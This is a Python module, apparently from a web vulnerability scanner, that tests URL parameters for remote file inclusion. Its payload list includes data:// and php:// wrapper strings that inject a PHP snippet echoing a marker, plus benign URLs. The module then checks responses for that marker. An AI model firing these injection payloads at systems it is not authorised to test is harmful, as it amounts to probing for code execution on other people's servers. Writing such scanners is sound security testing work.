"""rfi — Remote File Inclusion probe (needs external server or data://)"""
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.http import HttpClient

# data:// and php:// wrappers don't need external server
PAYLOADS = [
    "data://text/plain;base64,PD9waHAgZWNobyAib21uaV9yZmlfbWFya2VyIjsgPz4=",  # <?php echo "omni_rfi_marker"; ?>
    "data://text/plain,<?php echo 'omni_rfi_marker'; ?>",
    "php://filter/convert.base64-encode/resource=http://example.com",
    "http://127.0.0.1:80/",
    "https://example.com/robots.txt",
    "//example.com/robots.txt",
]

MARKERS = ["omni_rfi_marker", "User-agent: *"]

class Rfi:
    def run(self, session, logger):
        target = session.target
        http = HttpClient(session, logger)
        u = urlparse(target)
        params = parse_qs(u.query) or {"file": ["index"]}
        findings = []

        for name in params:
            for p in PAYLOADS:
                q = dict(params); q[name] = [p]
                url = urlunparse(u._replace(query=urlencode(q, doseq=True)))
                r = http.get(url)
                if not r: continue
                for m in MARKERS:
                    if m in r.text:
                        findings.append({"param":name,"payload":p,"marker":m})
                        print(f"  [!] RFI: {name}={p[:60]}")
                        logger.finding("rfi","critical",f"{name} {p[:60]}")
                        break

        print(f"[rfi] {len(findings)}")
        return {"findings": findings}
